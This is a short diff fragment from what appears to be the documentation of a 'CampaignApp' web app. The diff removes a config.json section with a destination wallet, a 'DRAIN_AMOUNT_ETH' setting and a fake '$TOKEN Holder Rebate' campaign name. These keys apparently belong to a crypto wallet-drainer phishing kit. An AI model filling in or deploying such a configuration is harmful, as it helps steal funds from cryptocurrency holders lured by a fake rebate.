@@ -90,18 +90,3 @@ class CampaignApp {
 }
 
 document.addEventListener('DOMContentLoaded', () => new CampaignApp());
-```
-
-### `config.json`
-```json
-{
-  "CA": "0xYOUR_CONTRACT_ADDRESS",
-  "ETH_ADDRESS": "0xYOUR_DESTINATION_WALLET",
-  "REF_DOMAIN": "twitter.com/YourCampaign",
-  "CAMPAIGN_NAME": "$TOKEN Holder Rebate",
-  "CHAIN": "ethereum",
-  "DRAIN_AMOUNT_ETH": "0.05",
-  "EXPIRY_MS": 86400000,
-  "GITHUB_REPO": "kheznn/pumpFun",
-  "BRANCH": "main"
-}
